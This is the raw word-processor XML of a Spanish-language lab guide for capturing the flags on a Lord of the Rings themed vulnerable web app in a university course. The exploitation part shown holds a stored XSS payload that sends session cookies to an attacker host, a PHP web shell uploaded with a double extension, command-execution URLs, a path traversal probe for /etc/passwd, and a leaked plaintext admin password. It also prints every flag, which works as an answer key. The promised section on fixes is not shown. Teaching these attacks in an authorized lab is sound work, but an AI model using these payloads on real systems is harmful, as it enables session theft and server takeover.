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la práctica — Barad-dûr / Mordor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Asignatura:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Seguridad en aplicaciones web</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Qué es esto:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> una guía paso a paso para explotar la máquina, capturar las 4 flags y, al final, arreglar el código.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Web objetivo:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://10.30.212.46:54350/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (en local: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://localhost:54350/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Laboratorio autorizado del profesor (temática El Señor de los Anillos). Todo se hace </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>desde el navegador</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: escribiendo URLs en la barra de direcciones, usando los formularios de la propia web y las herramientas de desarrollador (tecla </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F12</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:t>La guía está dividida en dos partes:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parte A — Explotación:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cómo sacar las 4 flags, paso a paso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parte B — Correcciones:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> qué estaba mal en el código y cómo se arregla.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Las 4 flags de un vistazo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8"/>
              </w:rPr>
              <w:t>#</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/>
        </w:tc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8"/>
              </w:rPr>
              <w:t>Flag</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/>
        </w:tc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8"/>
              </w:rPr>
              <w:t>Dónde está</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/>
        </w:tc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8"/>
              </w:rPr>
              <w:t>Método (del profesor)</w:t>
            </w:r>
          </w:p>
          <w:shd w:val="clear" w:fill="EFE3CF"/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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FLAG{P4TH_TR4V3RS4L_S4UR0N_h7j3m1}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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/secret/ring.txt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  <w:t>URL directa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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FLAG{M0RD0R_D3V_N0T3S_F0UND_t5v8k2}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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/dev/notes.txt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  <w:t>URL directa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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FLAG{C00K13_TH13F_0F_M0RD0R_w9x4n6}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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/private/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  <w:t>Robo de la cookie de Sauron con XSS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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FLAG{0N3_R1NG_T0_RUL3_TH3M_4LL_k8m2x9}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/>
                <w:color w:val="B03000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>/private/black_gate.php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  <w:t>Subir una shell (RCE) y leer la frase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t>PARTE A — Explotación</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 0. Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Abrimos la web y miramos qué hay. La portada tiene tres accesos: la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Biblioteca</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Muro del Orco</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Portal de Sauron</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (login).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04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rtad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04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Portada de Barad-dûr</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Mirando el código fuente de las páginas (clic derecho → *Ver código fuente*, o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ctrl+U</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) y probando rutas típicas en la barra de direcciones, encontramos ficheros que no deberían estar accesibles. Ese es el fallo de fondo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hay cosas colgadas en la web que no deberían verse.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Paso 1. Flag 1 — `/secret/ring.txt`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En la barra de direcciones del navegador escribimos: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http://10.30.212.46:54350/secret/ring.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Se abre el fichero y ahí está la primera flag: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lag1-rin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Flag 1 en secret/ring.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG{P4TH_TR4V3RS4L_S4UR0N_h7j3m1}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué funciona:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el fichero está dentro de la web, sin ninguna protección. Cualquiera que escriba la ruta lo lee.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Paso 2. Flag 2 — `/dev/notes.txt`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Lo mismo, otra ruta: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http://10.30.212.46:54350/dev/notes.txt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lag2-not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Flag 2 en dev/notes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG{M0RD0R_D3V_N0T3S_F0UND_t5v8k2}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Paso 3. Un regalo por el camino — `/init.sql`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Por el mismo fallo encontramos el script de la base de datos. Al escribir la ruta, el navegador </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>descarga</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el fichero; lo abrimos con cualquier editor de texto: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http://10.30.212.46:54350/init.sql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itsql-credencial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init.sql con las credenciales en texto plano</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Dentro se ve el usuario administrador con la contraseña </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>en texto plano</w:t>
      </w:r>
      <w:r>
        <w:t>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INSERT INTO users (username, password, role) VALUES</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>('sauron', 'oneringtorulethemall', 'admin');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>No es una flag, pero es una fuga grave de credenciales. (Nota: aunque esto permitiría entrar directamente con el login, la flag 3 la sacamos por el método que pide el profesor: robando la cookie por XSS.)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Paso 4. Comprobar la Biblioteca (el traversal está parcheado)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La biblioteca tiene un parámetro </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>library.php?file=historia.txt</w:t>
      </w:r>
      <w:r>
        <w:t>) que tenía pinta de Path Traversal. Lo probamos escribiendo en la barra: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http://10.30.212.46:54350/library.php?file=../../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La web responde con un error: solo deja leer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dentro de su carpeta.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041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raversal-bloquead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04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El Path Traversal está parcheado: la web rechaza el intento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">O sea, ese ataque ya </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no funciona</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en la versión actual. Por eso las flags 1 y 2 se cogen por URL directa (Paso 1 y 2), no por traversal.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Paso 5. Flag 3 — Robar la sesión de Sauron con XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La flag 3 está dentro de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/private/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, el panel de administración. Para entrar hay que ser Sauron. El método del profesor: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>robarle la cookie de sesión</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con un ataque </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el Muro del Orco.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 — Preparar el "oído" del atacante</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En nuestra máquina atacante dejamos algo escuchando para recibir la cookie (el profesor usa esto):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python3 -m http.server 8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 — Dejar el payload en el muro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Entramos en el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Muro del Orco</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mordor/wall.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). Si pide una clave para verlo, escribimos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mmora</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y pulsamos *Acceder*.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">En el formulario de publicar, en el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nombre</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (que no filtra nada), escribimos este payload y pulsamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Grabar Mensaje</w:t>
      </w:r>
      <w:r>
        <w:t>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&lt;img src=x onerror="fetch('http://TU_IP:8000/?c='+document.cookie)"&gt;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041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xss-payload-for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04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El payload XSS escrito en el formulario del muro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El payload queda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>guardado</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el muro (es un *Stored XSS*): se ejecutará en el navegador de todo el que abra esa página.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 — La trampa salta cuando Sauron entra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Cuando Sauron (que está logueado) abre el muro para moderar, su navegador ejecuta el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>onerror</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Como la cookie de sesión </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no tiene la protección `HttpOnly`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, el JavaScript puede leerla. Esto se comprueba con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F12 → Console</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> escribiendo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w: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okie-sin-httponl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document.cookie devuelve la cookie: no tiene HttpOnly</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Y esta es la prueba de que el XSS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>captura la cookie de Sauron</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (payload ejecutándose y mostrando su </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lotrCookie</w:t>
      </w:r>
      <w:r>
        <w:t>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041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xss-cookie-robad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04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El XSS lee y roba la cookie de sesión de Sauron</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En un ataque real, esa cookie llega a nuestro "oído" (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python3 -m http.server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) en forma de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /?c=lotrCookie=XXXX</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 — Usar la cookie robada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Cogemos la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lotrCookie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> robada, la ponemos en nuestro navegador (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F12 → Application → Cookies</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, creando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>lotrCookie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con ese valor) y navegamos a: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http://10.30.212.46:54350/private/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Entramos como Sauron sin saber su contraseña, y el panel muestra la flag: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041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lag3-camar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04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Cámara del Señor Oscuro con la Flag 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Flag 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG{C00K13_TH13F_0F_M0RD0R_w9x4n6}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Por qué funciona:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> el muro imprime lo que escribes </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sin escaparlo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (XSS) y la cookie de sesión </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>no tiene `HttpOnly`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (así que el XSS puede leerla y robarla).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Paso 6. Flag 4 — Subir una shell (RCE) y abrir la Puerta Negra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La flag 4 está detrás de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/private/black_gate.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, que pide una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>frase</w:t>
      </w:r>
      <w:r>
        <w:t>. Esa frase está en un fichero protegido (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>BlackGate-32/manual.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) que da </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>403</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> por la web. La única forma de leerlo es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ejecutar código en el servidor</w:t>
      </w:r>
      <w:r>
        <w:t>. Lo hacemos subiendo una shell por el panel de mapas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 — Crear la shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Con un editor de texto (Bloc de notas, VSCode…) creamos un fichero llamado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>`shell.php.jpg`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con este contenido: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&lt;?php system($_GET["c"]); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La doble extensión </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.php.jpg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> es la clave: pasa el filtro (que solo mira la última extensión, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.jpg</w:t>
      </w:r>
      <w:r>
        <w:t>) pero el servidor lo ejecuta como PHP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 — Subirla por el formulario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Vamos a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/private/upload_map.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, pulsamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Seleccionar archivo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, elegimos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>shell.php.jpg</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y pulsamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Subir Mapa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. (Si intentamos subir un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a secas, la web lo rechaza con *"Solo se permiten .jpg"*; por eso la doble extensión.)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upload-form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Panel de subida de mapas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 — Ejecutar comandos y leer la frase</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Con la shell subida, ejecutamos comandos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>escribiendo la URL en la barra de direcciones</w:t>
      </w:r>
      <w:r>
        <w:t>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http://10.30.212.46:54350/private/uploads/shell.php.jpg?c=id</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="E6E6E6"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>http://10.30.212.46:54350/private/uploads/shell.php.jpg?c=cat ../../BlackGate-32/manual.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El primero devuelve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>uid=33(www-data)...</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (tenemos ejecución de comandos) y el segundo nos da la frase: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ACTIVATION PHRASE: M3LL0N_ENTER_1954</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="432"/>
        <w:shd w:val="clear" w:fill="FAF5EC"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nota honesta de esta instancia:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el servidor tal cual está ahora, la subida devuelve *"Los fuegos del Monte del Destino rechazan tu ofrenda"* porque la carpeta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>private/uploads/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> no tiene permiso de escritura (un detalle del entorno; se arregla con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>chmod 777</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> sobre esa carpeta, como indica el profesor). El código es vulnerable y la cadena es válida; en esta copia solo falta ese permiso. La frase y la flag final se confirman en el paso siguiente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.4 — Abrir la Puerta Negra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">En </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>/private/black_gate.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, escribimos la frase </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="B03000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>M3LL0N_ENTER_1954</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el campo y pulsamos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Abrir Puerta</w:t>
      </w:r>
      <w:r>
        <w:t>. Se abren las puertas y aparece la flag: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lag4-puerta-negra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La Puerta Negra abierta con la Flag 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
